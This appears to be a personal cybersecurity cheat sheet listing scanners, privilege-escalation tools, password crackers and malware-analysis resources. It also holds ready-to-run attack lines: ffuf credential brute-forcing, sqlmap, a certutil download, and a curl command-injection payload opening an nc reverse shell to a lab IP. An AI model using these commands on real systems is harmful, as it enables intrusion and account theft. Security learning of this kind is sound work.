# CyberSecResources
List of tools/resources for Cybersecurity
## Resources
- https://github.com/khanhnnvn/CEHv10/blob/master/Labs/CEHv10%20Module%2006%20System%20Hacking.pdf

## Websites
### Web Scanner
  - Burpsuite
  - OWASP ZAP
  - Vega
  - nmap
  - nikto
  - uniscan
  - ffuf
  - Arachni (Modular scanner with great CLI and web GUI)
  - Wapiti (Lightweight scanner for GET/POST attack surfaces)
  - SQLmap (SQL Injection + Command execution within SQL)
  - XSStrike (XSS scanner with payload fuzzing)

### Important Commands
    - ``` ffuf -w /path/to/wordlist -u https://target/FUZZ ```
    - ``` ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.134.222/customers/signup -mr "username already exists" ```
    - ``` ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.134.222/customers/login -fc 200 ```
  - ```sqlmap -u "http://example.com/login.php" --data "username=admin&password=test" --dbs```
  - PHP Filter Chaining (https://github.com/synacktiv/php_filter_chain_generator/tree/main)
    - How to use? https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/
  - sudo mount -t cifs //target-IP/cyberq /mnt/cyberq -o guest
  - ```ldapsearch -x -h 10.10.10.25 -b "(objectclass=user)" | grep sAMAccountName```
  - ```nmap --script ldap-rootdse 10.10.10.0/24```
  - knockpy To discover subdomains

### SSRF, RCE, XXE, LFI Helpers
  - SSRFire – SSRF exploitation automation (Python)
  - liffy – LFI to RCE using wrappers, filters, or logs
  - Kiterunner – Advanced wordlist-based directory busting with support for Swagger/OpenAPI
  - tplmap – Server-side template injection tool

### Spiders & Path Traversal
- Feroxbuster
- Dirsearch
- FFUF
- Dirb
- OWASP ZAP
- Burpsuite

## Privilege Escalation
### Linux
- LinPeas https://github.com/peass-ng/PEASS-ng
- DirtyCow https://github.com/firefart/dirtycow // https://github.com/firefart/dirtycow/blob/master/dirty.c
- linux-exploit-suggester
- https://www.revshells.com/
- Encode payload in URL
-     ```curl -s 'http://10.10.7.56/mbilling/lib/icepay/icepay.php' --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.0.186 4443 >/tmp/f;'```
  
### Windows
- BeRoot.exe
- WinPeas https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
- PowerUp.ps1

| Tool | Platform | Description |
| --------- | --------- | ----------- |
| winPEASx64.exe | Windows | Windows local enum (binary, no install) |
| PowerUp.ps1 | Windows | PowerShell-based privilege checks |
| Seatbelt | Windows | Targeted enumeration (token, policy, env) |
| SharpUp | Windows | C# version of PowerUp |
| AccessChk (Sysinternals) | Windows | Privilege and permissions checker |
| Enum.exe | Windows | Legacy tool for shares, users, etc. |
| net commands | Built-in | net user, net share, net localgroup etc. |
| WMIC | Built-in | System config and user query tool |

### Crack Passwords (Windows)
- L0phtCrack 7 – GUI cracking suite
- Mimikatz – Extracts credentials, SAM secrets, tickets
- CrackMapExec – Swiss army knife for Active Directory
- pwdump7 – Dump hashes from SAM
- secretsdump.py (Impacket) – Extract NTLM hashes from SAM + SYSTEM

## Enumerate OS
- nmap
- enum4linux
- uniscan

## Find Exploit-db Exploits commands line
- searchsploit

## Malware Analysis
### Offline Malware Analysis

#### Static

##### File Fingerprinting
- MD5/SHA2 Message Digest 

##### String Search
- PE Studio
- DIE
- FLOSS (Fire Eye) 
- Strings (Microsoft) 
- BinText

##### Packing/Obfuscation
- PEid (Find must common crypters, compilers and packer)
- DIE (Detect it Easy for ELF Malware)

##### Portable Executable information
- PE Explorer (EXE, ActiveX, DLL)

##### Identifying File Dependency
- Dependency Walker
- Virus Total

##### Malware Disassembly 
- IDA Pro
- Ghidra
- OllyDbg

### Malware Analysis Online
- https://hybrid-analysis.com/
- https://www.virustotal.com/
- https://whois.domaintools.com
- https://toolbar.netcraft.com/site_report?url
- https://www.robtex.com

No Distribution of results
- https://nodistribute.com/ # Preferred
- https://antiscan.me/
- https://www.virscan.org/language/en/ # Not tested
- https://spyralscanner.net/

### Additional
- Cuckoo sandbox
- Virusshare.com
- Malware traffic analysis
- certutil.exe -urlcache -split -f "gttp://pstools.exe" pstools.exe
